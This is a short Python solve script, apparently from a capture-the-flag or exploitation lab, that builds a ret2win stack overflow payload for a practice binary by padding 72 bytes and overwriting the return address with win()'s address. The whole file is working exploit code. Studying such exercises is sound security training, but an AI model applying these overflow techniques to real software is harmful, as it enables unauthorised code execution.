#!/usr/bin/env python3
"""ret2win exploit for vuln: overflow buf[64], overwrite the saved return
address with win()'s address.

Stack layout of vulnerable() (from objdump): buf sits at rbp-0x40, so it's
64 bytes of filler, then 8 bytes for the saved rbp, then the return address.

Usage:
    python3 solve.py            # prints the payload's length and writes payload.bin
    ./vuln < payload.bin         # or pipe it straight in
"""

import struct

WIN_ADDR = 0x4011B6  # from: objdump -d vuln | grep '<win>:'
OFFSET_TO_RETADDR = 64 + 8  # buf (64) + saved rbp (8)


def build_payload() -> bytes:
    payload = b"A" * OFFSET_TO_RETADDR + struct.pack("<Q", WIN_ADDR)
    assert 0x0A not in payload, "payload contains a newline byte, fgets would stop early"
    return payload


if __name__ == "__main__":
    data = build_payload()
    with open("payload.bin", "wb") as f:
        f.write(data)
    print(f"wrote payload.bin ({len(data)} bytes)")
